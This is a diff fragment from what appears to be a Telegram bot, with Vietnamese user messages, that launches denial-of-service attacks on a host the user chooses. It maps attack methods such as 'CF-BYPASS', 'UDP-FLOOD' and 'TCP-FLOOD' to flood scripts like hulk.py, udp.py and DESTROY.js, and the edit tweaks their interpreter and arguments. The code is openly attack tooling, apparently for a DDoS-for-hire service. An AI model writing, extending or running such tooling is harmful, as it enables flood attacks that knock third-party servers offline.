@@ -299,13 +299,13 @@ def attack_command(message):
             command = ["node", "DESTROY.js", host, "90", "64", "5", "proxy.txt"]
             duration = 90
         elif method == 'CF-BYPASS':
-            command = ["python", "hulk.py", host, "90", "64", "5"]
+            command = ["python2", "hulk.py", host, "90", "64", "5"]
             duration = 90
         elif method == 'UDP-FLOOD':
             if not port.isdigit():
                 bot.reply_to(message, 'Port phải là một số nguyên dương.')
                 return
-            command = ["python", "udp.py", host, port, "90", "64", "10"]
+            command = ["python", "udp.py", host, port, "90", "64", "443"]
             duration = 60
         elif method == 'TCP-FLOOD':
             if not port.isdigit():
